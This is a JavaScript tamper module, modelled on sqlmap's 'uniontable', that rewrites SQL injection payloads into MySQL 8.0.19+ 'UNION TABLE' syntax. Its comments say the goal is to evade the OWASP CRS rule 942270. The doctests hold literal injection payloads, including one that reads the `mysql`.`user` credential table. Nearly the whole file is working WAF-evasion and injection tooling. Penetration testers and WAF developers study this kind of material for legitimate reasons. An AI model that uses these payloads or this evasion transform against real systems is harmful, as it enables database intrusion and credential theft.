// 对标 sqlmap uniontable.py（MySQL >= 8.0.19 专用）：
// UNION SELECT * FROM <table> → UNION TABLE <table>（含子查询形式 (SELECT * FROM t)）
// TABLE <table> 是完整查询块，等价 SELECT * FROM <table>，但 payload 不再含
// SELECT/FROM 关键字 → CRS 942270 'union.*select.*from' 失配（可叠加 odbcbrace）
// 仅改写裸 * 列清单；显式列清单/WHERE 保持原样；ORDER BY/LIMIT 尾巴保留
export const uniontable = {
  name: 'uniontable',
  description: 'UNION SELECT * FROM t → UNION TABLE t（MySQL 8.0.19+，消除 SELECT/FROM 关键字）',
  doctests: [
    { input: '-1 UNION ALL SELECT * FROM users-- -', output: '-1 UNION ALL TABLE users-- -' },
    { input: '-1 UNION SELECT * FROM `mysql`.`user`#', output: '-1 UNION TABLE `mysql`.`user`#' },
    { input: '-1 UNION ALL SELECT * FROM users ORDER BY 1 LIMIT 1-- -', output: '-1 UNION ALL TABLE users ORDER BY 1 LIMIT 1-- -' },
    { input: '-1 AND (SELECT * FROM one)=0x41-- -', output: '-1 AND (TABLE one)=0x41-- -' },
    { input: '-1 UNION ALL SELECT NULL,CONCAT(0x71),NULL FROM users-- -', output: '-1 UNION ALL SELECT NULL,CONCAT(0x71),NULL FROM users-- -' }, // 显式列清单不动
    { input: '-1 UNION SELECT * FROM users WHERE id=1-- -', output: '-1 UNION SELECT * FROM users WHERE id=1-- -' }, // WHERE 不支持
  ],
  transform(payload) {
    let out = String(payload ?? '');
    if (!out) return out;
    const TABLE_RE = /`[^`]+`(?:\.`[^`]+`)?|\w+(?:\.\w+)?/;

    // 形式 1：UNION [ALL] SELECT * FROM <table> <tail>
    out = out.replace(
      /(UNION)(\s+ALL)?\s+SELECT\s+\*\s+FROM\s+(`[^`]+`(?:\.`[^`]+`)?|\w+(?:\.\w+)?)([\s\S]*?)(?=(?:--|#|\/\*)|$)/gi,
      (m, union, all, table, tail) => {
        const t = (tail || '').trim();
        if (t && !/^(?:ORDER\s+BY|LIMIT)\b/i.test(t)) return m;
        return `${union}${all || ''} TABLE ${table}${t ? ` ${t}` : ''}`;
      }
    );

    // 形式 2：( SELECT * FROM <table> <tail> ) 子查询
    out = out.replace(
      /\(\s*SELECT\s+\*\s+FROM\s+(`[^`]+`(?:\.`[^`]+`)?|\w+(?:\.\w+)?)([^()]*?)\s*\)/gi,
      (m, table, tail) => {
        const t = (tail || '').trim();
        if (t && !/^(?:ORDER\s+BY|LIMIT)\b/i.test(t)) return m;
        return `(TABLE ${table}${t ? ` ${t}` : ''})`;
      }
    );
    void TABLE_RE;
    return out;
  },
};
export default uniontable;
